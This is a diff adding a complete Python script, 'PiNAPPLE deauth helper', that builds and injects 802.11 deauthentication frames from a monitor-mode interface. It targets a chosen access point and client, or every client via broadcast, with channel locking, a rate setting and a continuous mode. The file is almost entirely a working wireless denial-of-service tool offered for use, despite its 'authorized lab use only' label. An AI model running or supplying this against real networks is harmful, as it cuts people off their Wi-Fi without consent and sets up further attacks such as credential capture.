@@ -1,0 +1,121 @@
+#!/usr/bin/env python3
+"""PiNAPPLE deauth helper (authorized lab use only).
+
+Sends 802.11 deauthentication frames directly from a monitor-mode interface.
+Unlike mdk4's deauth mode this does not wait to sniff a client first, so a
+directed burst works even when the target station is idle.  It also locks
+the interface to the target channel before injecting.
+
+Only the Python standard library is used.
+"""
+
+import argparse
+import re
+import shutil
+import signal
+import socket
+import subprocess
+import sys
+import time
+
+MAC_RE = re.compile(r'^(?:[0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$')
+BROADCAST = 'FF:FF:FF:FF:FF:FF'
+ETH_P_ALL = 0x0003
+# Minimal radiotap header: version 0, no fields, 8 bytes total.
+RADIOTAP = b'\x00\x00\x08\x00\x00\x00\x00\x00'
+
+_stop = False
+
+
+def mac_bytes(value):
+    return bytes.fromhex(value.replace(':', '').replace('-', ''))
+
+
+def deauth_frame(destination, source, bssid, sequence):
+    frame_control = b'\xc0\x00'               # management / deauth, no DS flags
+    duration = b'\x00\x00'
+    sequence_control = ((sequence & 0x0FFF) << 4).to_bytes(2, 'little')
+    reason = (1).to_bytes(2, 'little')        # reason 1: unspecified
+    return (frame_control + duration +
+            mac_bytes(destination) + mac_bytes(source) + mac_bytes(bssid) +
+            sequence_control + reason)
+
+
+def handle_signal(signum, frame):
+    global _stop
+    _stop = True
+
+
+def main():
+    parser = argparse.ArgumentParser(description='PiNAPPLE deauth injector')
+    parser.add_argument('bssid', help='target AP BSSID')
+    parser.add_argument('client', help='target client MAC, or FF:FF:FF:FF:FF:FF')
+    parser.add_argument('count', type=int, help='frames to send (ignored with --continuous)')
+    parser.add_argument('interface', nargs='?', default='wlan1')
+    parser.add_argument('--channel', type=int, default=0, help='lock interface to this channel')
+    parser.add_argument('--rate', type=int, default=20, help='frames per second (1-200)')
+    parser.add_argument('--continuous', action='store_true', help='run until stopped')
+    parser.add_argument('--iw', default=None, help='path to iw (auto-detected by default)')
+    args = parser.parse_args()
+
+    bssid = args.bssid.strip().upper()
+    client = args.client.strip().upper() or BROADCAST
+    if not MAC_RE.match(bssid):
+        raise SystemExit('invalid BSSID: %s' % args.bssid)
+    if not MAC_RE.match(client):
+        raise SystemExit('invalid client MAC: %s' % args.client)
+    if not 1 <= args.rate <= 200:
+        raise SystemExit('rate must be between 1 and 200 packets/second')
+    if args.channel and not 1 <= args.channel <= 14:
+        raise SystemExit('channel must be between 1 and 14')
+    if not args.continuous and args.count < 1:
+        raise SystemExit('count must be at least 1')
+
+    if args.channel:
+        iw = args.iw or shutil.which('iw') or '/usr/sbin/iw'
+        try:
+            result = subprocess.run(
+                [iw, 'dev', args.interface, 'set', 'channel', str(args.channel)],
+                capture_output=True, text=True, timeout=5)
+        except OSError as exc:
+            print('warning: could not run iw (%s); continuing on the current channel'
+                  % exc, flush=True)
+        else:
+            if result.returncode != 0:
+                raise SystemExit('could not set channel: %s' %
+                                 (result.stderr or result.stdout).strip())
+
+    signal.signal(signal.SIGTERM, handle_signal)
+    signal.signal(signal.SIGINT, handle_signal)
+
+    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
+    sock.bind((args.interface, 0))
+
+    sent = 0
+    sequence = 0
+    interval = 1.0 / args.rate
+    target = 'broadcast' if client == BROADCAST else client
+    print('deauth: %s -> %s on %s (rate %d pps%s)' % (
+        bssid, target, args.interface, args.rate,
+        ', channel %d' % args.channel if args.channel else ''), flush=True)
+
+    try:
+        while not _stop and (args.continuous or sent < args.count):
+            sock.send(RADIOTAP + deauth_frame(client, bssid, bssid, sequence))
+            sequence = (sequence + 1) & 0x0FFF
+            sent += 1
+            if sent % 20 == 0:
+                print('sent %d frames' % sent, flush=True)
+            time.sleep(interval)
+    except OSError as exc:
+        print('injection failed after %d frames: %s' % (sent, exc), flush=True)
+        return 1
+    finally:
+        sock.close()
+
+    print('done: sent %d deauth frames' % sent, flush=True)
+    return 0
+
+
+if __name__ == '__main__':
+    sys.exit(main())
